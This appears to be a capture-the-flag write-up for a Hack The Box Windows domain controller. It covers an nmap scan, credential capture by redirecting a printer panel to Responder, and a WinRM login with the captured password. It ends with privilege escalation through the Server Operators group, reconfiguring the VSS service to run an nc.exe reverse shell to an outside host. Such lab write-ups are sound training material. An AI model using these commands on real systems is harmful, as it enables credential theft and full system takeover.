# ENUMERATION

## NMAP

```bash
nmap -p- --min-rate=1000 -sVC -v -oN nmap 10.10.11.108

Increasing send delay for 10.10.11.108 from 10 to 20 due to 72 out of 239 dropped probes since last increase.
Increasing send delay for 10.10.11.108 from 20 to 40 due to 28 out of 93 dropped probes since last increase.
Nmap scan report for 10.10.11.108
Host is up (0.064s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-27 07:10:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-27T07:11:47
|_  start_date: N/A
|_clock-skew: -5m10s

```

## WEB SERVER

On the website we can see it has a printer service

We also see a settings.php page where we have some info about the printers, we can also modify the server address

### Gettings creds using responder

Now if we add our ip address and turn on the respnonder and update the settings we have the creds.

<img width="673" height="240" alt="image" src="https://github.com/user-attachments/assets/004e2aa0-d3fa-4a67-9fb0-d647527e54fc" />

```bash
responder -I tun0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

```

<img width="533" height="221" alt="image" src="https://github.com/user-attachments/assets/936f85a2-a159-4173-b272-2aa5e14fc23e" />

# Exploitation

## USER FLAG

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'                       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls ../Desktop 

    Directory: C:\Users\svc-printer\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/27/2025   8:21 AM             34 user.txt
```

## SHELL AS ROOT

```bash
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Here we see we have many privs but the bets one is server operators

In Windows Server environments, the Server Operators group is **a built-in security group that grants members specific administrative privileges for managing servers**. While not as powerful as Domain Admins, they can perform server-related tasks and log in locally, including on Domain Controllers, without needing full Domain Admin rights. 

### Modifying path of VSS service

Now, we can create a service named **vss** and configure it to execute our command when it starts. We can add a reverse shell as the start command, which will give us a root shell when the service runs.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe
                                        
Info: Uploading /home/kali/htb/return/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Data: 79188 bytes of 79188 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VSS binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.4 9001"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VSS
```

Simultaneously, we can listen on port **9001**, and once the service starts, we will receive a shell as **root**.

```bash
nc -lnvp 9001 
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.108] 49732
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
